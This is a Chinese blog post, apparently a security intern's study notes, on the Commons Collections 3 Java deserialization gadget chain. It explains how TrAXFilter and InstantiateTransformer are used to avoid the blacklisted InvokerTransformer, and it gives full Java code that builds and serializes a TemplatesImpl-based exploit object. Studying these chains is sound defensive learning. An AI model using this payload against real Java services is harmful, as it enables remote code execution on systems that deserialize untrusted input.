{"title":"Java反序列化4笔记","uid":"28bef31494b30752ba9f1f07e41299e2","slug":"Java反序列化4笔记","date":"2022-09-13T14:10:44.000Z","updated":"2022-09-14T05:13:01.669Z","comments":true,"path":"api/articles/Java反序列化4笔记.json","keywords":null,"cover":null,"content":"<meta name=\"referrer\" content=\"no-referrer\"/>\n\n<h1 id=\"参考资料：\"><a href=\"#参考资料：\" class=\"headerlink\" title=\"参考资料：\"></a>参考资料：</h1><p>p牛 Java安全漫谈 14   </p>\n<p><a href=\"https://t.zsxq.com/05rjA2NJU\">https://t.zsxq.com/05rjA2NJU</a></p>\n<p>p牛 JavaThings</p>\n<p><a href=\"https://github.com/phith0n/JavaThings\">https://github.com/phith0n/JavaThings</a></p>\n<h1 id=\"Common-Collection3\"><a href=\"#Common-Collection3\" class=\"headerlink\" title=\"Common Collection3\"></a>Common Collection3</h1><h2 id=\"InvokerTransformer\"><a href=\"#InvokerTransformer\" class=\"headerlink\" title=\"InvokerTransformer\"></a>InvokerTransformer</h2><p>CC1使用transfoemers讲几个不同的transfeomer包裹，在使用chainedtansformer将前一个tansformer的输出作为后一个tansformer的输入，再将其作为hashmap对象的回调，当put新值时就会触发回调执行命令</p>\n<p>动态加载字节码，使用TemplatesImpl加载字节码（动态码笔记就不放在博客了）</p>\n<p>CC3初始，将CC1和TemplatesImpl结合</p>\n<p><strong>代码在testclass里面，太长就不贴了</strong></p>\n<p>漫谈中提到，在发布yso后，有人发布了过滤反序列化链的工具SerialKiller，在这个工具中将CC1的invokertransformer类添加为黑名单，所以我们将不能使用它</p>\n<h2 id=\"com-sun-org-apache-xalan-internal-xsltc-trax-TrAXFilter\"><a href=\"#com-sun-org-apache-xalan-internal-xsltc-trax-TrAXFilter\" class=\"headerlink\" title=\"com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter\"></a>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</h2><p>这个类的构造方法中调用了 (TransformerImpl) templates.newTransformer()，免去使用InvokerTransformer手动调用newTransformer方法之一步</p>\n<p>这时个TransformerImpl对象，可以直接加载字节码</p>\n<p>但是，没有InvokerTransformer就无法使用TrAXFilter 类中的构造方法</p>\n<p>所以，需要 org.apache.commons.collections.functors.InstantiateTransformer  类，这个类也是一个实现了Transformer接口的类，作用是调用构造方法</p>\n<p>这样链路就完整了</p>\n<p>修改的Transformer调用链：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">Transformer[] transformers &#x3D; new Transformer[]&#123; \n\n\tnew ConstantTransformer(TrAXFilter.class), \n\n\tnew InstantiateTransformer( new Class[] &#123; Templates.class &#125;, \n\n\tnew Object[] &#123; obj &#125;) \n&#125;;  </code></pre>\n\n<p>将前面使用InvokerTransformer的Transformer替换即可</p>\n<h2 id=\"注意：\"><a href=\"#注意：\" class=\"headerlink\" title=\"注意：\"></a>注意：</h2><p>通前面的CC1一样，这也只是个demo，没有序列化，同时也只支持jdk8u71以下</p>\n<p>可以参考前面先让其序列化，在通过CC6文中介绍修改该链让其通杀</p>\n<p>p牛改造的可以在jdk8u71以下执行</p>\n<p>再按照CC6修改以下，成功在大于jdk8u71时执行命令</p>\n<h2 id=\"完整代码：\"><a href=\"#完整代码：\" class=\"headerlink\" title=\"完整代码：\"></a>完整代码：</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">package org.vulhub.sec;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport javassist.ClassPool;\nimport javassist.CtClass;\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InstantiateTransformer;\nimport org.apache.commons.collections.keyvalue.TiedMapEntry;\nimport org.apache.commons.collections.map.LazyMap;\nimport org.apache.commons.collections.map.TransformedMap;\n\nimport javax.xml.transform.Templates;\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.annotation.Retention;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Field;\nimport java.lang.reflect.InvocationHandler;\nimport java.util.HashMap;\nimport java.util.Map;\n\n&#x2F;&#x2F;通用版本\npublic class CommonCollection3 &#123;\n\tpublic static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;\n        Field field &#x3D; obj.getClass().getDeclaredField(fieldName);\n        field.setAccessible(true);\n        field.set(obj, value);\n    &#125;\n\tpublic static void main(String[] args) throws Exception &#123;\t \n\t\tTemplatesImpl obj &#x3D; new TemplatesImpl();\n&#x2F;&#x2F;\t\tsetFieldValue(obj, &quot;_bytecodes&quot;, new byte[][] &#123;code&#125;);\n\t\tsetFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;\n &#x2F;&#x2F;加载恶意类生成字节码，javassist第三方库            \n            ClassPool.getDefault().get(com.TemplatesImplTest.HelloTemplateImplTest.class.getName()).toBytecode()\n\t\t&#125;);\n\t\tsetFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);\n\t\tsetFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());\n\t\t \n\t\tTransformer[] fakeTransformers &#x3D; new Transformer[] &#123;new ConstantTransformer(1)&#125;;\n\t\tTransformer[] transformers &#x3D; new Transformer[]&#123; \n\t\t\t\tnew ConstantTransformer(TrAXFilter.class), \n\t\t\t\tnew InstantiateTransformer( new Class[] &#123; Templates.class &#125;, \n\t\t\t\tnew Object[] &#123; obj &#125;) \n\t\t&#125;; \n\t\tTransformer transformerChain &#x3D; new\n\t\t\t\tChainedTransformer(fakeTransformers);\n\t\tMap innerMap &#x3D; new HashMap();\n\t\tMap outerMap &#x3D; LazyMap.decorate(innerMap, transformerChain);\n\t\t&#x2F;&#x2F;通用链，使用TiedMapEntry\n\t\tTiedMapEntry tme &#x3D; new TiedMapEntry(outerMap, &quot;keykey&quot;);\n\t\t\n\t\tMap expMap &#x3D; new HashMap();\n\t\texpMap.put(tme, &quot;valuevalue&quot;);\n\t\touterMap.remove(&quot;keykey&quot;);\n\t\t\n\t\tField f &#x3D; ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);\n        f.setAccessible(true);\n        &#x2F;&#x2F;替换恶意transformer\n        f.set(transformerChain, transformers);\n        \n\t\t&#x2F;&#x2F;利用反射调用执行，这样不需要在之后输入map\n&#x2F;&#x2F;\t\tClass clazz &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);\n&#x2F;&#x2F;\t\tConstructor construct &#x3D; clazz.getDeclaredConstructor(Class.class, Map.class);\n&#x2F;&#x2F;\t\tconstruct.setAccessible(true);\n        \n&#x2F;&#x2F;\t    InvocationHandler handler &#x3D; (InvocationHandler) construct.newInstance(Retention.class, outerMap);\n&#x2F;&#x2F;\t\tsetFieldValue(transformerChain, &quot;iTransformers&quot;, transformers);\n\t\t \n\t\t&#x2F;&#x2F;序列化\t\t\n\t\tByteArrayOutputStream barr &#x3D; new ByteArrayOutputStream();\n\t\tObjectOutputStream oos &#x3D; new ObjectOutputStream(barr);\n\t\t&#x2F;&#x2F;写入数据\n\t\toos.writeObject(expMap);\n\t\toos.close();\n\t\t&#x2F;&#x2F;写入ObjectInputStream\n\t\tSystem.out.println(barr);\n\t\tObjectInputStream ois &#x3D; new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));\n\t\t&#x2F;&#x2F;反序列化\n\t\tObject o &#x3D; (Object)ois.readObject();\t\t\t\n\t&#125;\n&#125;\n</code></pre>\n\n","text":" 参考资料：p牛 Java安全漫谈 14 https://t.zsxq.com/05rjA2NJU p牛 JavaThings https://github.com/phith0n/JavaThings Common Collection3InvokerTransformerCC...","link":"","photos":[],"count_time":{"symbolsCount":"5.1k","symbolsTime":"5 mins."},"categories":[{"name":"Java安全","slug":"Java安全","count":11,"path":"api/categories/Java安全.json"}],"tags":[{"name":"Java","slug":"Java","count":19,"path":"api/tags/Java.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99%EF%BC%9A\"><span class=\"toc-text\">参考资料：</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#Common-Collection3\"><span class=\"toc-text\">Common Collection3</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#InvokerTransformer\"><span class=\"toc-text\">InvokerTransformer</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#com-sun-org-apache-xalan-internal-xsltc-trax-TrAXFilter\"><span class=\"toc-text\">com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%B3%A8%E6%84%8F%EF%BC%9A\"><span class=\"toc-text\">注意：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%AE%8C%E6%95%B4%E4%BB%A3%E7%A0%81%EF%BC%9A\"><span class=\"toc-text\">完整代码：</span></a></li></ol></li></ol>","author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个不想开挂的安全实习生","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"Java反序列化5笔记","uid":"98f7491bb751eb8b6537f6ad2a4d2b25","slug":"Java反序列化5笔记","date":"2022-09-13T14:10:58.000Z","updated":"2022-09-13T14:29:35.662Z","comments":true,"path":"api/articles/Java反序列化5笔记.json","keywords":null,"cover":[],"text":" 参考资料：p牛 Java安全漫谈 15 https://t.zsxq.com/06NneiyFI Java Things https://github.com/phith0n/JavaThings Orange blog文章： http://blog.orange.tw/201...","link":"","photos":[],"count_time":{"symbolsCount":"8.4k","symbolsTime":"8 mins."},"categories":[{"name":"Java安全","slug":"Java安全","count":11,"path":"api/categories/Java安全.json"}],"tags":[{"name":"Java","slug":"Java","count":19,"path":"api/tags/Java.json"}],"author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个不想开挂的安全实习生","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"Java反序列化3笔记","uid":"cc6f53e8dc634d13d7c94fb0decfd921","slug":"Java反序列化3笔记","date":"2022-09-11T09:54:16.000Z","updated":"2022-09-11T10:28:25.262Z","comments":true,"path":"api/articles/Java反序列化3笔记.json","keywords":null,"cover":[],"text":" 参考资料：p牛 Java安全漫谈 12 Java反序列化6 https://t.zsxq.com/05vVVfAeI Common Collection6前面学习cc1的时候发现cc1有版本限制问题，所以这个阶段来解决版本限制问题，一种通用的反序列化链，也就是cc6 Annot...","link":"","photos":[],"count_time":{"symbolsCount":"4.3k","symbolsTime":"4 mins."},"categories":[{"name":"Java安全","slug":"Java安全","count":11,"path":"api/categories/Java安全.json"}],"tags":[{"name":"Java","slug":"Java","count":19,"path":"api/tags/Java.json"}],"author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个不想开挂的安全实习生","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}